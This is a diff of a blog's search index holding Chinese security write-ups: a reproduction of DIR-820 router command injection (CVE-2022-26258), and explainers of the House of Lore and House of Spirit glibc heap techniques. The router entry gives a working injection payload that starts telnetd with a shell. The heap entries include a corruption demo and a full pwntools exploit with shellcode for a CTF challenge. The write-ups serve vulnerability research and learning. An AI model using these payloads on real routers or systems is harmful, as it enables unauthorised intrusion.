@@ -1,6 +1,166 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>DIR-820 CVE-2022-26258</title>
+    <url>/2024/08/16/DIR-820%20CVE-2022-26258/</url>
+    <content><![CDATA[<h2 id="官方漏洞描述"><a href="#官方漏洞描述" class="headerlink" title="官方漏洞描述"></a>官方漏洞描述</h2><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141131392.png" alt="image-20220425141131392"></p>
+<p>根据漏洞描述我们可以发现漏洞是在/lan.asp中存在一个Device Name导致的一个命令执行</p>
+<h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p><img src="/pic/CVE-2022-26258/1.png" alt="img"></p>
+<p><img src="/pic/CVE-2022-26258/2.png" alt="img"></p>
+<p>通过搜索发现 是把lan_device_name的值传入拼接paramStr</p>
+<p>进一步审计发现 copyDataToDataModelFormat是返回paramStr的也就是说 最后是提交给了get_set.ccp</p>
+<p><img src="/pic/CVE-2022-26258/3.png" alt="img"></p>
+<p>我们用grep -r “get_set.cpp”是查不到相关信息的，既然没有“get_set.ccp”文件，那么可能是这个URL会交给后端处理，处理好之后返回给用户结果。</p>
+<p><img src="/pic/CVE-2022-26258/4.png" alt="img"></p>
+<p>我们通过grep -r “get_set”发现这四个二进制文件中有调用于是我们进一步更进 去分析这四个二进制文件</p>
+<p>然后我们再去看一下开机自启文件包括哪些</p>
+<p><img src="/pic/CVE-2022-26258/5.png" alt="img"></p>
+<p>可以看到开机自启了ncc2和bulkListen</p>
+<p>所以可见正确答案是ncc2的位置，因为有get_set字符串和相对应的函数</p>
+<p><img src="/pic/CVE-2022-26258/6.png" alt="img"></p>
+<p>先对ncc2进行一个简单的分析</p>
+<p><img src="/pic/CVE-2022-26258/7.png" alt="img"></p>
+<p>这里先是对fork子进程的一个检测来判断ncc2是否启动，然后对信号量进行一系列的设置然后设置信号处理函数 再通过ncc_load_hw_cfg设置pin码(这里介绍一下 PIN码（Personal Identification Number, 个人识别号码）是一种为了安全目的而设计的数字代码，通常用于验证用户的身份) 在后面就是一些其他服务的配置部分了</p>
+<p>然后进一步分析 敏感函数 由于是命令执行我们去审system函数的代码</p>
+<p><img src="/pic/CVE-2022-26258/8.png" alt="img"></p>
+<p>这些都不存在命令任意执行漏洞，我们发现还有一个_system函数，想要快速的找到漏洞点就需要根据另一个线索点(Device Name)进行寻找。我们在搜索字符串时如果直接指定DeviceName还是比较难找到的，这里可以先简单搜索Device，然后搜索Name，寻找交叉点</p>
+<p><img src="/pic/CVE-2022-26258/9.png" alt="img"></p>
+<p><img src="/pic/CVE-2022-26258/10.png" alt="img"></p>
+<p>然后定位到sub_4F6DFC函数</p>
+<p><img src="/pic/CVE-2022-26258/11.png" alt="img"></p>
+<p>有两条路径一个利用下面的_system另一个是利用上面的_system</p>
+<p>先分析第一条路径：</p>
+<p>关键是看a2是否可控：</p>
+<p><img src="/pic/CVE-2022-26258/12.png" alt="img"></p>
+<p><img src="/pic/CVE-2022-26258/13.png" alt="img"></p>
+<p><img src="/pic/CVE-2022-26258/14.png" alt="img"></p>
+<p>发现不可控 此路不通0……….0</p>
+<p>第二条路径：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Obj = (const char **)getObj(0x60u, (int)v9);</span><br><span class="line">v4 = Obj;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>v4是<code>getObj</code>函数的返回值Obj，需要绕过<code>hasInjectionString</code>的判断才能到达命令注入点，现在需要找到<code>hasInjectionString</code> 函数在哪个文件中，同样使用<code>grep -r</code> 命令：</p>
+<p><img src="/pic/CVE-2022-26258/15.png" alt="img"></p>
+<p><img src="/pic/CVE-2022-26258/16.png" alt="img"></p>
+<p>这里就是一些简单的过滤 没有过滤冒号和换行符，可以使用“\n”来绕过</p>
+<p>这里就可以通过修改参数来进行命令执行了</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo ./run.sh -r DIR820L /home/luyouqi/模拟/Dir-820/DIR820LA1_FW105B03.bin</span><br></pre></td></tr></tbody></table></figure>
+
+<p>用FIRMAE进行环境直接模拟</p>
+<p><img src="/pic/CVE-2022-26258/17.png" alt="img"></p>
+<p>模拟好之后是这样 访问后</p>
+<p><img src="/pic/CVE-2022-26258/18.png" alt="img"></p>
+<p>默认密码是空直接登录就可 必须要登录这是验证后的命令执行漏洞</p>
+<p><img src="/pic/CVE-2022-26258/19.png" alt="img"></p>
+<p><img src="/pic/CVE-2022-26258/20.png" alt="img"></p>
+<p>修改红框参数为 %0atelnetd  -l /bin/sh%0a</p>
+<p>这里要注意直接在原包上进行修改 而不是放入重放后修改再发送，原因是会认定发送了多次导致崩溃 无法执行，发送后在等十秒就可以了</p>
+<p><img src="/pic/CVE-2022-26258/21.png" alt="img"></p>
+<p>再用telnet进行连接 就可以成功拿到shell</p>
+<p><img src="/pic/CVE-2022-26258/22.png" alt="img"></p>
+<h2 id="额外挖掘"><a href="#额外挖掘" class="headerlink" title="额外挖掘"></a>额外挖掘</h2><p>额外漏洞查找，一般漏洞存在就意味着肯定不只一个 我们继续去查询可能涉及到http_post且是需要执行的语句</p>
+<p><img src="/pic/CVE-2022-26258/23.png" alt="img"></p>
+<p>可以看到这个界面也是post指令传入 那我们就跟进tools_vct.asp查看</p>
+<p><img src="/pic/CVE-2022-26258/24.png" alt="img"></p>
+<p>传入的是ping.cpp</p>
+<p>通过前面的过程 查询发现可能还是在ncc2中 继续审代码发现</p>
+<p><img src="/pic/CVE-2022-26258/25.png" alt="img"></p>
+<p>是不是非常熟悉基本和前面那个洞没区别了</p>
+<p><img src="/pic/CVE-2022-26258/26.png" alt="img"></p>
+<p>然后发送 之后连接看看能否拿到shell</p>
+<p><img src="/pic/CVE-2022-26258/27.png" alt="img"></p>
+<p>成功了！！！！ </p>
+<p>刚准备去交cnvd的 结果一查</p>
+<p><img src="/pic/CVE-2022-26258/28.png" alt="img"></p>
+<p>得 白高兴一场 早被打了</p>
+<p>参考文献：<a href="https://cn-sec.com/archives/1262036.html">https://cn-sec.com/archives/1262036.html</a></p>
+]]></content>
+      <categories>
+        <category>iot</category>
+        <category>漏洞复现</category>
+        <category>dir</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现---命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>house-of-lore</title>
+    <url>/2024/08/15/house%20of%20lore/</url>
+    <content><![CDATA[<h2 id="使用版本以及影响"><a href="#使用版本以及影响" class="headerlink" title="使用版本以及影响"></a>使用版本以及影响</h2><p>2.23-2.31(不包含2.31)</p>
+<p><strong>libc-2.23</strong></p>
+<p><strong>libc-2.27</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br></pre></td></tr></tbody></table></figure>
+
+<p>检查 fakechunk-&gt;FD 是不是 victim_chunk</p>
+<p><strong>libc-2.31</strong>（House Of Lore 被ban）</p>
+<h2 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h2><p>house of lore是通过small bin机制，去进行任意地址的chunk 分配</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>House of Lore 利用的前提是需要控制 Small Bin Chunk 的bk指针，并且控制指定位置 chunk 的fd指针</li>
+</ul>
+<h2 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h2><p>在_int_malloc libc2.23版本的3405的位置</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (in_smallbin_range (nb))</span><br><span class="line">   {</span><br><span class="line">     idx = smallbin_index (nb);</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     if ((victim = last (bin)) != bin)</span><br><span class="line">       {</span><br><span class="line">         if (victim == 0) /* initialization check */</span><br><span class="line">           malloc_consolidate (av);</span><br><span class="line">         else</span><br><span class="line">           {</span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               {</span><br><span class="line">                 errstr = "malloc(): smallbin double linked list corrupted";</span><br><span class="line">                 goto errout;</span><br><span class="line">               }</span><br><span class="line">             set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">             bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">             if (av != &amp;main_arena)</span><br><span class="line">               victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             void *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             return p;</span><br><span class="line">           }</span><br><span class="line">       }</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="第一块碎片"><a href="#第一块碎片" class="headerlink" title="第一块碎片"></a>第一块碎片</h3><pre><code>  if ((victim = last (bin)) != bin)
+    {
+      if (victim == 0) /* initialization check */
+        malloc_consolidate (av);
+      else
+        {
+          bck = victim-&gt;bk;
+</code></pre>
+<p>如果victim不是small bin的最后一个也就是未满的情况</p>
+<p>bck=victim-&gt;bk           此时bk被我们伪造为target addr   所以bck=target addr</p>
+<h3 id="第二块碎片"><a href="#第二块碎片" class="headerlink" title="第二块碎片"></a>第二块碎片</h3><pre><code>          set_inuse_bit_at_offset (victim, nb);
+          bin-&gt;bk = bck;
+          bck-&gt;fd = bin;
+</code></pre>
+<p>bin-&gt;bk=bck,这就相当于把target addr  链入small bin的开头，接下来我们就可以通过malloc把这取出来</p>
+<h3 id="第三块碎片"><a href="#第三块碎片" class="headerlink" title="第三块碎片"></a>第三块碎片</h3><p>要执行这一步要经过这个check</p>
+<pre><code>if (__glibc_unlikely (bck-&gt;fd != victim))
+            {
+              errstr = "malloc(): smallbin double linked list corrupted";
+              goto errout;
+            }
+</code></pre>
+<p>也就是bck-&gt;fd=victim  也就是说  target_addr+0x10 的位置要等于victim的地址</p>
+<h2 id="接下来通过demo演示-实验环境2-23"><a href="#接下来通过demo演示-实验环境2-23" class="headerlink" title="接下来通过demo演示(实验环境2.23)"></a>接下来通过demo演示(实验环境2.23)</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char * argv[]){</span><br><span class="line">    intptr_t* stack_buffer_1[4] = {0};</span><br><span class="line">    intptr_t* stack_buffer_2[4] = {0};</span><br><span class="line">    intptr_t *victim = malloc(0x100);</span><br><span class="line">    malloc(0x10);</span><br><span class="line">    free(victim);</span><br><span class="line">    malloc(0x400);</span><br><span class="line">    victim[1] = &amp;stack_buffer_1; // victim_chunk_addr-&gt;bk = stack_buffer_1_addr</span><br><span class="line">    stack_buffer_1[2] = victim-2; //stack_buffer_1-&gt;fd = victim_chunk_addr</span><br><span class="line">//===============================line=================================</span><br><span class="line">    intptr_t *p1 = malloc(0x100);</span><br><span class="line">    intptr_t *p2 = malloc(0x100);//chunk on the stack</span><br><span class="line">    malloc(0x100); //failed : bck-&gt;fd != victim</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>堆块布局：</strong></p>
+<pre><code>intptr_t* stack_buffer_1[4] = {0};
+intptr_t* stack_buffer_2[4] = {0};
+intptr_t *victim = malloc(0x100);
+malloc(0x10);
+free(victim);
+malloc(0x400);
+</code></pre>
+<p><img src="/pic/house_of_lore/0.png" alt="img"></p>
+<p>此时的malloc(0x400)是为了将unsorted bin 变为small bin</p>
+<p><strong>布置攻击条件</strong></p>
+<pre><code>victim[1] = &amp;stack_buffer_1; // victim_chunk_addr-&gt;bk = stack_buffer_1_addr
+stack_buffer_1[2] = victim-2; //stack_buffer_1-&gt;fd = victim_chunk_addr
+</code></pre>
+<p><img src="/pic/house_of_lore/1.png" alt="img"></p>
+<h3 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h3><p><img src="/pic/house_of_lore/2.png" alt="img"></p>
+<p>接下来在申请一次就可以再目标地址布置堆</p>
+<p><img src="/pic/house_of_lore/3.png" alt="img"></p>
+<h2 id="2-27源码更改"><a href="#2-27源码更改" class="headerlink" title="2.27源码更改"></a>2.27源码更改</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">  if (in_smallbin_range (nb))</span><br><span class="line">    {</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      if ((victim = last (bin)) != bin)</span><br><span class="line">        {</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  if (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr ("malloc(): smallbin double linked list corrupted");</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          if (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">	  /* While we're here, if we see other chunks of the same size,</span><br><span class="line">	     stash them in the tcache.  */</span><br><span class="line">	  size_t tc_idx = csize2tidx (nb);</span><br><span class="line">	  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    {</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      /* While bin not empty and tcache not full, copy chunks over.  */</span><br><span class="line">	      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		{</span><br><span class="line">		  if (tc_victim != 0)</span><br><span class="line">		    {</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      if (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            }</span><br><span class="line">		}</span><br><span class="line">	    }</span><br><span class="line">#endif</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>要么使其满足 <code>tc_victim = last (bin)) == bin</code>、要么使其满足：<code>tcache-&gt;counts[tc_idx] ≥ mp_.tcache_count</code>。否则可能会因为非法内存访问使得程序 <code>down</code> 掉。</p>
+<p>高版本的情况2.31之后利用条件比较苛刻，有这利用条件 早就别的路去打io了</p>
+<p>参考文献</p>
+<p><a href="https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/">https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/</a></p>
+<p><a href="https://tty-flag.github.io/2021/04/20/House-of-lore.html">House of lore - TTY的博客 (tty-flag.github.io)</a></p>
+<p>[House Of Lore-原理 | Pwn进你的心 (ywhkkx.github.io)](<a href="https://ywhkkx.github.io/2022/03/10/House">https://ywhkkx.github.io/2022/03/10/House</a> Of Lore-原理/)</p>
+]]></content>
+      <categories>
+        <category>pwn学习</category>
+        <category>堆利用</category>
+      </categories>
+      <tags>
+        <tag>house_of</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>TOTOLINK_NR1800X Multi-vulnerability analysis</title>
     <url>/2024/08/17/TOTOLINK_NR1800X%20Multi-vulnerability%20analysis/</url>
     <content><![CDATA[<h2 id="固件提取："><a href="#固件提取：" class="headerlink" title="固件提取："></a>固件提取：</h2><figure class="highlight ruby"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.totolink.net/home</span><span class="regexp">/menu/detail</span><span class="regexp">/menu_listtpl/download</span><span class="regexp">/id/</span><span class="number">225</span>/ids/<span class="number">36</span>.html</span><br></pre></td></tr></tbody></table></figure>
@@ -132,6 +292,59 @@
       </tags>
   </entry>
   <entry>
+    <title>house-of-Spirit</title>
+    <url>/2024/08/15/house%20of%20spirit/</url>
+    <content><![CDATA[<h2 id="House-of-Spirit-是-the-Malloc-Maleficarum-中的一种技术。"><a href="#House-of-Spirit-是-the-Malloc-Maleficarum-中的一种技术。" class="headerlink" title="House of Spirit 是 the Malloc Maleficarum 中的一种技术。"></a>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</h2><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
+<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
+<ul>
+<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
+<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
+<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
+<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li>
+<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
+</ul>
+<h3 id="我们通过原理去分析-这些检测的绕过的代码原理"><a href="#我们通过原理去分析-这些检测的绕过的代码原理" class="headerlink" title="我们通过原理去分析 这些检测的绕过的代码原理"></a>我们通过原理去分析 这些检测的绕过的代码原理</h3><h3 id="MALLOC-ALIGN-MASK"><a href="#MALLOC-ALIGN-MASK" class="headerlink" title="MALLOC_ALIGN_MASK"></a>MALLOC_ALIGN_MASK</h3><p>因为fake_chunk可以在任意可写位置构造，这里对齐指的是地址上的对齐而不仅仅是内存对齐，比如32位程序的话fake_chunk的prev_size所在地址就应该位<code>0xXXXX0</code>或<code>0xXXXX4</code>。64位的话地址就应该在<code>0xXXXX0</code>或<code>0xXXXX8</code></p>
+<h3 id="fake-chunk-的-ISMMAP"><a href="#fake-chunk-的-ISMMAP" class="headerlink" title="fake chunk 的 ISMMAP"></a>fake chunk 的 ISMMAP</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#if HAVE_MMAP   </span><br><span class="line">    if (chunk_is_mmapped(p))       /* release mmapped memory. */</span><br><span class="line">    {     /* see if the dynamic brk/mmap threshold needs adjusting */</span><br><span class="line">        if (!mp_.no_dyn_threshold</span><br><span class="line">            &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold         </span><br><span class="line">            &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)       </span><br><span class="line">        {         </span><br><span class="line">            mp_.mmap_threshold = chunksize (p);</span><br><span class="line">            mp_.trim_threshold = 2 * mp_.mmap_threshold;       </span><br><span class="line">        }     </span><br><span class="line">        munmap_chunk(p);     </span><br><span class="line">    return;   </span><br><span class="line">    }</span><br><span class="line"> #endi</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以看到， MMAP 位需要置 0 ，否则 free 会，调用 munmap_chunk() 函数 unmap 本 chunk ，达不到进入 fastbin 的目的。</p>
+<h2 id="fake-chunk-的-size"><a href="#fake-chunk-的-size" class="headerlink" title="fake chunk 的 size"></a>fake chunk 的 size</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (*fb != NULL</span><br><span class="line">    &amp;&amp; __builtin_expect (fastbin_index(chunksize(*fb)) != idx, 0))               </span><br><span class="line">    {         </span><br><span class="line">        errstr = "invalid fastbin entry (free)";         </span><br><span class="line">        goto errout;       </span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p> fake chunk 的 size 大小 需要满足对应的 fastbin 的 index ，同时也得对齐。</p>
+<h2 id="fake-chunk-的-next-chunk"><a href="#fake-chunk-的-next-chunk" class="headerlink" title="fake chunk 的 next chunk"></a>fake chunk 的 next chunk</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">    || __builtin_expect (chunksize (chunk_at_offset (p, size))&gt;= av-&gt;system_mem, 0))       </span><br><span class="line">    { </span><br><span class="line">#ifdef ATOMIC_FASTBINS         </span><br><span class="line">    /* We might not have a lock at this point and concurrent modifications</span><br><span class="line">       of system_mem might have let to a false positive.  Redo the test</span><br><span class="line">       after getting the lock.  */</span><br><span class="line">    if (have_lock</span><br><span class="line">        || ({ assert (locked == 0);</span><br><span class="line">              mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">              locked = 1;</span><br><span class="line">              chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ                     </span><br><span class="line">              || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;               </span><br><span class="line">            })) </span><br><span class="line">#endif           </span><br><span class="line">            {             </span><br><span class="line">                errstr = "free(): invalid next size (fast)";             </span><br><span class="line">                goto errout;           </span><br><span class="line">            } </span><br><span class="line">#ifdef ATOMIC_FASTBINS         </span><br><span class="line">            if (! have_lock)           </span><br><span class="line">                {             </span><br><span class="line">                    (void)mutex_unlock(&amp;av-&gt;mutex);             </span><br><span class="line">                    locked = 0;           </span><br><span class="line">                } </span><br><span class="line">#endif       </span><br><span class="line">    } </span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="fake-chunk-对应的-fastbin-链表头部"><a href="#fake-chunk-对应的-fastbin-链表头部" class="headerlink" title="fake chunk 对应的 fastbin 链表头部"></a>fake chunk 对应的 fastbin 链表头部</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (__builtin_expect (*fb == p, 0))       </span><br><span class="line">    {         </span><br><span class="line">        errstr = "double free or corruption (fasttop)";         </span><br><span class="line">        goto errout;       </span><br><span class="line">    } </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h2 id="例题-I-ctf-pwn200"><a href="#例题-I-ctf-pwn200" class="headerlink" title="例题 I ctf pwn200"></a>例题 I ctf pwn200</h2><h3 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路:"></a>核心思路:</h3><p>通过house of spirit 进行fake chunk的伪造在栈上布置fake chunk 然后劫持程序流 走ret2shellcode</p>
+<h3 id="静态分析："><a href="#静态分析：" class="headerlink" title="静态分析："></a>静态分析：</h3><p><img src="/pic/house_of_spirit/0.png" alt="img"></p>
+<p>通过静态分析我们可以了解基本思路，接下来我们通过动态调试去看看</p>
+<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">rl("who are u?\n")</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')</span><br><span class="line">payload  = b''</span><br><span class="line">payload += shellcode.ljust(48,b'\x00')</span><br><span class="line">mx.send(payload)</span><br><span class="line">stack_addr=l64()</span><br><span class="line">log_addr(stack_addr)</span><br><span class="line">rl("give me your id ~~?\n")</span><br><span class="line">mx.sendline('1') 错误 改为52</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>特别注意</strong> 这里的id不能输入小2*minsize的值 因为是作为下一个chunk的size 位 要满足check的条件 不然就会报错</p>
+<p>看一下我们输入的值和泄露的地址的布局</p>
+<p><img src="/pic/house_of_spirit/1.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">rl("give me money~")</span><br><span class="line">fake_addr = stack_addr - 0x90 # offset 0x40 to shellcode, 0x400a29 return address</span><br><span class="line">log_addr(fake_addr)</span><br><span class="line">data = p64(0) * 4 + p64(0) + p64(0x41)      # no strcpy</span><br><span class="line">data = data.ljust(56, b'\x00') + p64(fake_addr)</span><br><span class="line">mx.send(data)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>进行覆盖修改ptr和fake chunk的伪造</p>
+<p><img src="/pic/house_of_spirit/2.png" alt="img"></p>
+<p>然后我们把这个fake_chunk free 再add回来劫持控制流</p>
+<p><img src="/pic/house_of_spirit/3.png" alt="img"></p>
+<p><img src="/pic/house_of_spirit/4.png" alt="img"></p>
+<p>成功shell</p>
+<p><img src="/pic/house_of_spirit/5.png" alt="img"></p>
+<p>exp如下:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#--------------------setting context---------------------</span><br><span class="line">context.clear(arch='amd64', os='linux', log_level='debug')</span><br><span class="line"></span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">sla = lambda data, content: mx.sendlineafter(data,content)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">sl = lambda data: mx.sendline(data)</span><br><span class="line">rl = lambda data: mx.recvuntil(data)</span><br><span class="line">re = lambda data: mx.recv(data)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">inter = lambda: mx.interactive()</span><br><span class="line">l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))</span><br><span class="line">h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))</span><br><span class="line">s=lambda data: mx.send(data)</span><br><span class="line">log_addr=lambda data: log.success("---&gt;"+hex(data))</span><br><span class="line">p = lambda s: print('\033[1;31;40m%s --&gt; 0x%x \033[0m' % (s, eval(s)))</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(mx)</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------</span><br><span class="line"># libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')</span><br><span class="line">filename = "./pwn200"</span><br><span class="line">mx = process(filename)</span><br><span class="line">#mx = remote("node5.anna.nssctf.cn",24071)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">#初始化完成---------------------------------------------------------\</span><br><span class="line">dbg()</span><br><span class="line">rl("who are u?\n")</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')</span><br><span class="line">payload  = b''</span><br><span class="line">payload += shellcode.ljust(48,b'\x00')</span><br><span class="line">mx.send(payload)</span><br><span class="line">stack_addr=l64()</span><br><span class="line">log_addr(stack_addr)</span><br><span class="line">rl("give me your id ~~?\n")</span><br><span class="line">mx.sendline('52')</span><br><span class="line">pause()</span><br><span class="line">rl("give me money~")</span><br><span class="line">fake_addr = stack_addr - 0x90 # offset 0x40 to shellcode, 0x400a29 return address</span><br><span class="line">log_addr(fake_addr)</span><br><span class="line">data = p64(0) * 4 + p64(0) + p64(0x41)      # no strcpy</span><br><span class="line">data = data.ljust(56, b'\x00') + p64(fake_addr)</span><br><span class="line">mx.send(data)</span><br><span class="line">pause()</span><br><span class="line">rl("your choice : ")</span><br><span class="line">sl(b"2")</span><br><span class="line">rl("your choice : ")</span><br><span class="line">sl(b"1")</span><br><span class="line">rl("how long?\n")</span><br><span class="line">sl(str(0x30))</span><br><span class="line">rl("give me more money : \n")</span><br><span class="line">payload=p64(0)*3+p64(stack_addr-0x50)</span><br><span class="line">mx.send(payload)</span><br><span class="line"># payload</span><br><span class="line">inter()</span><br></pre></td></tr></tbody></table></figure>
+]]></content>
+      <categories>
+        <category>pwn学习</category>
+        <category>堆利用</category>
+      </categories>
+      <tags>
+        <tag>house_of</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>house-of-cat</title>
     <url>/2024/08/14/house%20of%20cat/</url>
     <content><![CDATA[<h1 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本:"></a>适用版本:</h1><h3 id="2-23-2-25"><a href="#2-23-2-25" class="headerlink" title="2.23-2.25"></a>2.23-2.25</h3><h1 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h1><p>–能<strong>任意写</strong>一个<strong>可控</strong>地址（如largebin attack）</p>
@@ -221,209 +434,82 @@
       </tags>
   </entry>
   <entry>
-    <title>DIR-820 CVE-2022-26258</title>
-    <url>/2024/08/16/DIR-820%20CVE-2022-26258/</url>
-    <content><![CDATA[<h2 id="官方漏洞描述"><a href="#官方漏洞描述" class="headerlink" title="官方漏洞描述"></a>官方漏洞描述</h2><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141131392.png" alt="image-20220425141131392"></p>
-<p>根据漏洞描述我们可以发现漏洞是在/lan.asp中存在一个Device Name导致的一个命令执行</p>
-<h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p><img src="/pic/CVE-2022-26258/1.png" alt="img"></p>
-<p><img src="/pic/CVE-2022-26258/2.png" alt="img"></p>
-<p>通过搜索发现 是把lan_device_name的值传入拼接paramStr</p>
